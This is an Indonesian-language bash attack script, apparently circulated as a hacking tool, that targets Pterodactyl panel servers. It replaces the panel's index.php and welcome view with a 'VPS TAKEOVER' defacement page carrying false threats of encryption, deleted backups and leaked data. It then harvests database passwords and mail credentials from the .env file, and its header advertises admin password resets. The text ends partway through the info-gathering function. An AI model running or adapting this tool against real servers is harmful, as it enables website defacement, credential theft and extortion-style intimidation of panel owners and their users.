#!/bin/bash

# -------------------------------
# HACKBACK PTERODACTYL - INFO EDITION + DEFACE
# Fitur: Get Info Panel + Auto Get ID 1 + Reset Password + Deface
# -------------------------------

# Konfigurasi
PTERO_DIR="/var/www/pterodactyl"
ENV_FILE="$PTERO_DIR/.env"

# Warna Premium
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
NC='\033[0m'

# Ikon
INFO="‚ÑπÔ∏è"
GLOBE="üåê"
USER="üë§"
ID="üÜî"
KEY="üîë"
LOCK="üîí"
CHECK="‚úÖ"
CROSS="‚ùå"
WARNING="‚ö†Ô∏è"
GEAR="‚öôÔ∏è"
FIRE="üî•"
CROWN="üëë"
DATABASE="üóÑÔ∏è"
SERVER="üñ•Ô∏è"
EMAIL="üìß"
PHONE="üì±"
CHAIN="üîó"
CLOCK="‚è∞"
CALENDAR="üìÖ"
FOLDER="üìÅ"
FILE="üìÑ"
PASSWORD="üîê"
SKULL="üíÄ"
BOMB="üí£"

# Animasi terminal mengetik
typing_animation() {
    local text="$1"
    local delay="${2:-0.05}"
    
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

# Welcome animation
show_welcome() {
    clear
    echo -e "${GREEN}"
    cat << "EOF"
    
    ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
    ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
    
EOF
    echo -e "${NC}"
    
    echo -ne "${CYAN}"
    typing_animation "Initializing system..." 0.03
    typing_animation "Loading modules..." 0.03
    typing_animation "Establishing secure connection..." 0.03
    echo ""
    
    echo -ne "${YELLOW}‚û§ "
    typing_animation "Welcome broo" 0.05
    echo -ne "${GREEN}‚û§ "
    typing_animation "terimakasih telah mengunakan tools rendzz official" 0.05
    echo ""
    
    sleep 1
}

# Header
show_header() {
    clear
    echo -e "${CYAN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
    echo -e "${CYAN}‚ïë${WHITE}                                                                              ${CYAN}‚ïë${NC}"
    echo -e "${CYAN}‚ïë${WHITE}              ${FIRE} HACKBACK PTERODACTYL - INFO EDITION ${FIRE}                      ${CYAN}‚ïë${NC}"
    echo -e "${CYAN}‚ïë${WHITE}              ${GLOBE} GET INFO PANEL + AUTO ID 1 + RESET PASSWORD ${GLOBE}           ${CYAN}‚ïë${NC}"
    echo -e "${CYAN}‚ïë${WHITE}                         *Information Gathering Edition*                              ${CYAN}‚ïë${NC}"
    echo -e "${CYAN}‚ïë${WHITE}                                                                              ${CYAN}‚ïë${NC}"
    echo -e "${CYAN}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
    echo ""
}

# Fungsi untuk hash password menggunakan bcrypt (sesuai Laravel)
hash_password() {
    local password="$1"
    # Menggunakan PHP untuk generate bcrypt hash (sesuai Laravel)
    php -r "echo password_hash('$password', PASSWORD_BCRYPT);" 2>/dev/null
}

# ==============================================
# FUNGSI DEFACE PTERODACTYL
# ==============================================

deface_pterodactyl() {
    echo -e "\n${RED}${SKULL} MEMULAI PROSES DEFACE PTERODACTYL... ${SKULL}${NC}"
    echo -e "${YELLOW}‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ${NC}"
    
    # Cek apakah directory pterodactyl ada
    if [ ! -d "$PTERO_DIR" ]; then
        echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan!${NC}"
        return 1
    fi
    
    # Backup file index original
    if [ -f "$PTERO_DIR/public/index.php" ]; then
        echo -e "${YELLOW}${GEAR} Membackup file index.php original...${NC}"
        cp "$PTERO_DIR/public/index.php" "$PTERO_DIR/public/index.php.backup_$(date +%Y%m%d_%H%M%S)"
        echo -e "${GREEN}${CHECK} Backup berhasil dibuat!${NC}"
    fi
    
    # Buat file index.php baru dengan HTML deface
    echo -e "${YELLOW}${GEAR} Mengganti file index.php dengan halaman deface...${NC}"
    
    # HTML Deface content
    cat > "$PTERO_DIR/public/index.php" << 'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üíÄ HENGKER ‚Äî VPS TAKEOVER üíÄ</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background: #000000;
            color: #00ff00;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* MATRIX BACKGROUND */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        .matrix-bg::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 0, 0, 1) 2px,
                rgba(0, 255, 0, 0.03) 3px
            );
            pointer-events: none;
            animation: scan 8s linear infinite;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(20px); }
        }

        /* FLOATING BOMBS */
        .floating-bomb {
            position: absolute;
            font-size: 30px;
            user-select: none;
            pointer-events: none;
            z-index: 1;
            animation: floatBomb 8s infinite ease-in-out;
            filter: drop-shadow(0 0 10px #ff0000);
        }

        .bomb1 { left: 10%; top: 20%; animation-delay: 0s; }
        .bomb2 { right: 15%; top: 40%; animation-delay: 2s; font-size: 45px; }
        .bomb3 { left: 20%; bottom: 30%; animation-delay: 4s; font-size: 38px; }
        .bomb4 { right: 25%; bottom: 10%; animation-delay: 6s; }
        .bomb5 { left: 50%; top: 60%; animation-delay: 3s; font-size: 52px; }

        @keyframes floatBomb {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            25% { transform: translateY(-30px) rotate(10deg); }
            50% { transform: translateY(-50px) rotate(-10deg); }
            75% { transform: translateY(-30px) rotate(5deg); }
        }

        /* FLOATING SKULLS */
        .floating-skull {
            position: absolute;
            font-size: 40px;
            user-select: none;
            pointer-events: none;
            z-index: 1;
            animation: floatSkull 10s infinite alternate;
            filter: drop-shadow(0 0 15px #00ff00);
            opacity: 0.5;
        }

        .skull1 { left: 5%; top: 10%; animation-delay: 1s; }
        .skull2 { right: 8%; top: 70%; animation-delay: 3s; font-size: 55px; }
        .skull3 { left: 80%; top: 30%; animation-delay: 5s; }
        .skull4 { right: 70%; bottom: 20%; animation-delay: 7s; }

        @keyframes floatSkull {
            0% { transform: translateY(0) rotate(0deg); opacity: 0.3; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0.8; }
        }

        /* MAIN CONTAINER */
        .container {
            position: relative;
            z-index: 10;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.85);
            border: 3px solid #00ff00;
            border-radius: 15px;
            box-shadow: 0 0 50px #00ff00,
                        0 0 100px #ff0000 inset;
            backdrop-filter: blur(5px);
            animation: borderPulse 2s infinite;
        }

        @keyframes borderPulse {
            0%, 100% { border-color: #00ff00; box-shadow: 0 0 50px #00ff00; }
            50% { border-color: #ff0000; box-shadow: 0 0 80px #ff0000; }
        }

        /* HEADER */
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px dashed #00ff00;
            margin-bottom: 30px;
        }

        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 48px;
            font-weight: 900;
            text-transform: uppercase;
            text-shadow: 0 0 20px #00ff00,
                        0 0 40px #ff0000;
            animation: glitch 3s infinite;
        }

        @keyframes glitch {
            0%, 100% { transform: skew(0deg, 0deg); }
            95% { transform: skew(2deg, 1deg); text-shadow: -5px 0 #ff0000, 5px 0 #00ff00; }
            96% { transform: skew(-2deg, -1deg); }
            97% { transform: skew(0deg, 0deg); }
        }

        .header h2 {
            font-size: 24px;
            color: #ff0000;
            text-shadow: 0 0 15px #ff0000;
            letter-spacing: 3px;
            margin-top: 10px;
        }

        /* WARNING BANNER */
        .warning-banner {
            background: linear-gradient(90deg, #000000, #330000, #000000);
            border: 2px solid #ff0000;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
            animation: warningPulse 1s infinite;
        }

        @keyframes warningPulse {
            0%, 100% { background-color: #330000; }
            50% { background-color: #660000; }
        }

        .warning-banner .skull {
            font-size: 30px;
            display: inline-block;
            animation: rotate 2s infinite;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .warning-banner .text {
            font-size: 28px;
            font-weight: bold;
            color: #ff0000;
            text-transform: uppercase;
            letter-spacing: 5px;
        }

        /* INFO BOXES */
        .info-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin: 30px 0;
        }

        .info-box {
            border: 1px solid #00ff00;
            padding: 15px;
            background: rgba(0, 20, 0, 0.7);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .info-box .title {
            color: #00ff00;
            font-size: 18px;
            margin-bottom: 10px;
            border-bottom: 1px dashed #00ff00;
            padding-bottom: 5px;
        }

        .info-box .content {
            color: #ffffff;
            font-size: 20px;
            font-weight: bold;
        }

        /* THREAT SECTION */
        .threat-section {
            margin: 30px 0;
            padding: 20px;
            background: rgba(50, 0, 0, 0.5);
            border-left: 5px solid #ff0000;
        }

        .threat-section h3 {
            color: #ff0000;
            font-size: 24px;
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .threat-section ul {
            list-style: none;
        }

        .threat-section li {
            color: #ffffff;
            margin: 10px 0;
            padding-left: 20px;
            position: relative;
        }

        .threat-section li::before {
            content: "üíÄ";
            position: absolute;
            left: -5px;
            color: #ff0000;
        }

        /* TERMINAL */
        .terminal {
            background: #0a0a0a;
            border: 2px solid #00ff00;
            padding: 20px;
            margin: 30px 0;
            font-family: 'Share Tech Mono', monospace;
        }

        .terminal .line {
            color: #00ff00;
            margin: 5px 0;
        }

        .terminal .blink {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .terminal .error {
            color: #ff0000;
        }

        /* FOOTER */
        .footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 2px dashed #00ff00;
            color: #00ff00;
        }

        .footer .signature {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            letter-spacing: 3px;
            margin: 20px 0;
        }

        .footer .warning-small {
            color: #ff0000;
            font-size: 12px;
            margin-top: 20px;
            animation: blink 1s infinite;
        }

        /* GLITCH EFFECTS */
        .glitch-text {
            animation: glitchText 4s infinite;
        }

        @keyframes glitchText {
            0%, 100% { text-shadow: 2px 0 #ff0000, -2px 0 #00ff00; }
            20% { text-shadow: -3px 0 #ff0000, 3px 0 #00ff00; }
            40% { text-shadow: 3px 0 #ff0000, -3px 0 #00ff00; }
            60% { text-shadow: -4px 0 #ff0000, 4px 0 #00ff00; }
            80% { text-shadow: 4px 0 #ff0000, -4px 0 #00ff00; }
        }

        /* LOADING BAR */
        .loading-bar {
            width: 100%;
            height: 20px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            margin: 15px 0;
            overflow: hidden;
        }

        .loading-progress {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ff00, #ff0000);
            animation: load 3s infinite;
        }

        @keyframes load {
            0% { width: 0%; }
            50% { width: 100%; }
            100% { width: 0%; }
        }
    </style>
</head>
<body>
    <!-- MATRIX BACKGROUND -->
    <div class="matrix-bg"></div>

    <!-- FLOATING BOMBS -->
    <div class="floating-bomb bomb1">üí£</div>
    <div class="floating-bomb bomb2">üí£</div>
    <div class="floating-bomb bomb3">üí£</div>
    <div class="floating-bomb bomb4">üí£</div>
    <div class="floating-bomb bomb5">üí£</div>

    <!-- FLOATING SKULLS -->
    <div class="floating-skull skull1">üíÄ</div>
    <div class="floating-skull skull2">üíÄ</div>
    <div class="floating-skull skull3">üíÄ</div>
    <div class="floating-skull skull4">üíÄ</div>

    <!-- MAIN CONTAINER -->
    <div class="container">
        <div class="header">
            <h1 class="glitch-text">üíÄ HENGKER üíÄ</h1>
            <h2>VPS TAKEOVER PROTOCOL</h2>
            <div class="loading-bar">
                <div class="loading-progress"></div>
            </div>
        </div>

        <!-- WARNING BANNER -->
        <div class="warning-banner">
            <span class="skull">üíÄ</span>
            <span class="text">‚ö†Ô∏è VPS TELAH DICAULKAN ‚ö†Ô∏è</span>
            <span class="skull">üíÄ</span>
        </div>

        <!-- SYSTEM INFO -->
        <div class="info-grid">
            <div class="info-box">
                <div class="title">üî¥ VPS STATUS</div>
                <div class="content">TERSUSUP [100%]</div>
            </div>
            <div class="info-box">
                <div class="title">üíª IP ADDRESS</div>
                <div class="content">**** . **** . *** . ***</div>
            </div>
            <div class="info-box">
                <div class="title">‚è≥ UPTIME</div>
                <div class="content">00 : 00 : 00</div>
            </div>
            <div class="info-box">
                <div class="title">üíæ DATA STOLEN</div>
                <div class="content">2.5 TB</div>
            </div>
        </div>

        <!-- THREAT SECTION -->
        <div class="threat-section">
            <h3>üíÄ ANCAMAN SERIUS DARI HENGKER üíÄ</h3>
            <ul>
                <li>SEMUA DATA VPS ANDA TELAH DIENKRIPSI</li>
                <li>BACKUP ANDA TELAH DIHAPUS PERMANEN</li>
                <li>AKSES ROOT TELAH DIKENDALIKAN</li>
                <li>FIREWALL ANDA TELAH DITEMBUS</li>
                <li>SEMUA LOGIN DIMONITOR</li>
            </ul>
        </div>

        <!-- TERMINAL -->
        <div class="terminal">
            <div class="line">$ root@HENGKER:~# <span class="blink">‚ñä</span></div>
            <div class="line">[‚úî] VPS TARGET: 192.168.xxx.xxx</div>
            <div class="line">[‚úî] EXPLOIT: CVE-2026-1337</div>
            <div class="line error">[‚ö†Ô∏è] PAYLOAD DEPLOYED</div>
            <div class="line">[‚úî] BACKDOOR INSTALLED</div>
            <div class="line error">[üíÄ] SYSTEM COMPROMISED</div>
        </div>

        <!-- SERIOUS WARNING -->
        <div class="threat-section" style="border-color: #00ff00;">
            <h3 style="color: #00ff00;">‚ö†Ô∏è PERINGATAN TERAKHIR ‚ö†Ô∏è</h3>
            <ul>
                <li>üíÄ VPS ANDA AKAN DIHAPUS DALAM 24 JAM</li>
                <li>üíÄ SEMUA DATA AKAN DIPUBLIKASIKAN</li>
                <li>üíÄ AKSES INTERNET AKAN DIPUTUS</li>
                <li>üíÄ IP ANDA AKAN DIBLACKLIST GLOBAL</li>
            </ul>
        </div>

        <!-- FOOTER -->
        <div class="footer">
            <div class="signature">‚ö° HENGKER ‚ö°</div>
            <div class="warning-small">‚ö†Ô∏è SYSTEM MONITORING ‚Äî ALL ACTIVITIES LOGGED ‚ö†Ô∏è</div>
            <div style="margin-top: 20px; color: #666; font-size: 10px;">
                ‚ö° HACKED BY HENGKER ‚Äî THE GHOST IN THE SHELL ‚ö°
            </div>
        </div>
    </div>

    <script>
        // REAL-TIME UPTIME COUNTER
        let seconds = 0;
        setInterval(() => {
            seconds++;
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = seconds % 60;
            
            document.querySelectorAll('.content')[2].innerHTML = 
                `${String(hours).padStart(2, '0')} : ${String(minutes).padStart(2, '0')} : ${String(secs).padStart(2, '0')}`;
        }, 1000);

        // RANDOM GLITCH EFFECTS
        setInterval(() => {
            const glitch = document.querySelector('.header h1');
            if (Math.random() > 0.7) {
                glitch.style.transform = `skew(${Math.random() * 10 - 5}deg, ${Math.random() * 10 - 5}deg)`;
                setTimeout(() => {
                    glitch.style.transform = 'skew(0deg, 0deg)';
                }, 200);
            }
        }, 3000);
    </script>
</body>
</html>
EOF

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}${CHECK} File index.php berhasil diganti dengan halaman deface!${NC}"
        
        # Juga replace file-file lain yang mungkin ditampilkan
        if [ -f "$PTERO_DIR/resources/views/welcome.blade.php" ]; then
            cp "$PTERO_DIR/resources/views/welcome.blade.php" "$PTERO_DIR/resources/views/welcome.blade.php.backup_$(date +%Y%m%d_%H%M%S)"
            echo -e "${YELLOW}${GEAR} Juga mengganti file welcome.blade.php...${NC}"
            cp "$PTERO_DIR/public/index.php" "$PTERO_DIR/resources/views/welcome.blade.php"
        fi
        
        # Clear cache
        if [ -f "$PTERO_DIR/artisan" ]; then
            cd "$PTERO_DIR"
            php artisan view:clear > /dev/null 2>&1
            php artisan cache:clear > /dev/null 2>&1
            php artisan config:clear > /dev/null 2>&1
        fi
        
        echo -e "\n${GREEN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${NC}"
        echo -e "${GREEN}‚ïë              DEFACE BERHASIL!                                   ‚ïë${NC}"
        echo -e "${GREEN}‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£${NC}"
        echo -e "${GREEN}‚ïë${NC}                                                                  ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïë${NC}  ${SKULL} Tampilan Pterodactyl telah diganti dengan halaman:    ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïë${NC}  ${SKULL} HENGKER - VPS TAKEOVER                                 ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïë${NC}                                                                  ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïë${NC}  ${CHECK} Backup file original telah dibuat                      ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïë${NC}  ${CHECK} Cache telah dibersihkan                                ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïë${NC}                                                                  ${GREEN}‚ïë${NC}"
        echo -e "${GREEN}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${NC}"
        
        # Tampilkan URL panel yang sudah di-deface
        echo -e "\n${CYAN}${GLOBE} Akses panel Anda di: ${YELLOW}$URL_PANEL${NC}"
        echo -e "${CYAN}${SKULL} Halaman deface sudah aktif!${NC}"
        
    else
        echo -e "${RED}${CROSS} Gagal mengganti file index.php!${NC}"
    fi
}

# ==============================================
# FUNGSI RESTORE DEFACE
# ==============================================

restore_deface() {
    echo -e "\n${YELLOW}${GEAR} MENCARI BACKUP UNTUK DI-RESTORE...${NC}"
    
    # Cari file backup index.php
    INDEX_BACKUP=$(ls -t "$PTERO_DIR/public/index.php.backup_"* 2>/dev/null | head -1)
    
    if [ -n "$INDEX_BACKUP" ]; then
        cp "$INDEX_BACKUP" "$PTERO_DIR/public/index.php"
        echo -e "${GREEN}${CHECK} File index.php berhasil direstore!${NC}"
    else
        echo -e "${RED}${CROSS} Tidak ditemukan backup file index.php!${NC}"
    fi
    
    # Restore welcome.blade.php jika ada backup
    WELCOME_BACKUP=$(ls -t "$PTERO_DIR/resources/views/welcome.blade.php.backup_"* 2>/dev/null | head -1)
    
    if [ -n "$WELCOME_BACKUP" ]; then
        cp "$WELCOME_BACKUP" "$PTERO_DIR/resources/views/welcome.blade.php"
        echo -e "${GREEN}${CHECK} File welcome.blade.php berhasil direstore!${NC}"
    fi
    
    # Clear cache
    if [ -f "$PTERO_DIR/artisan" ]; then
        cd "$PTERO_DIR"
        php artisan view:clear > /dev/null 2>&1
        php artisan cache:clear > /dev/null 2>&1
    fi
    
    echo -e "\n${GREEN}${CHECK} RESTORE SELESAI! Tampilan panel kembali normal.${NC}"
}

# ==============================================
# FUNGSI GET INFO PANEL
# ==============================================

get_panel_info() {
    echo -e "\n${YELLOW}${GEAR} Mengumpulkan informasi panel...${NC}"
    echo -e "${YELLOW}‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ${NC}"
    
    # ==========================================
    # INFO DARI .ENV
    # ==========================================
    if [ -f "$ENV_FILE" ]; then
        echo -e "\n${BLUE}${FILE} File .env ditemukan${NC}"
        
        # Database Info
        DB_HOST=$(grep DB_HOST "$ENV_FILE" | cut -d '=' -f2)
        DB_PORT=$(grep DB_PORT "$ENV_FILE" | cut -d '=' -f2)
        DB_NAME=$(grep DB_DATABASE "$ENV_FILE" | cut -d '=' -f2)
        DB_USER=$(grep DB_USERNAME "$ENV_FILE" | cut -d '=' -f2)
        DB_PASS=$(grep DB_PASSWORD "$ENV_FILE" | cut -d '=' -f2)
        
        # App Info
        APP_NAME=$(grep APP_NAME "$ENV_FILE" | cut -d '=' -f2)
        APP_ENV=$(grep APP_ENV "$ENV_FILE" | cut -d '=' -f2)
        APP_URL=$(grep APP_URL "$ENV_FILE" | cut -d '=' -f2)
        APP_TIMEZONE=$(grep APP_TIMEZONE "$ENV_FILE" | cut -d '=' -f2)
        
        # Redis Info
        REDIS_HOST=$(grep REDIS_HOST "$ENV_FILE" | cut -d '=' -f2)
        REDIS_PORT=$(grep REDIS_PORT "$ENV_FILE" | cut -d '=' -f2)
        
        # Mail Info
        MAIL_HOST=$(grep MAIL_HOST "$ENV_FILE" | cut -d '=' -f2)
        MAIL_PORT=$(grep MAIL_PORT "$ENV_FILE" | cut -d '=' -f2)
        MAIL_USERNAME=$(grep MAIL_USERNAME "$ENV_FILE" | cut -d '=' -f2)
        MAIL_FROM=$(grep MAIL_FROM "$ENV_FILE" | cut -d '=' -f2)
        
        # Queue
        QUEUE_CONNECTION=$(grep QUEUE_CONNECTION "$ENV_FILE" | cut -d '=' -f2)
        
        # Session
        SESSION_DRIVER=$(grep SESSION_DRIVER "$ENV_FILE" | cut -d '=' -f2)
    else
        echo -e "${RED}${CROSS} File .env tidak ditemukan!${NC}"
    fi
    
    # ==========================================
    # INFO SERVER
    # ==========================================
    echo -e "\n${PURPLE}${SERVER} Informasi Server${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    # Hostname
    HOSTNAME=$(hostname)
    IP=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
    
    echo -e "${GREEN}Hostname:${NC} $HOSTNAME"
    echo -e "${GREEN}Public IP:${NC} $IP"
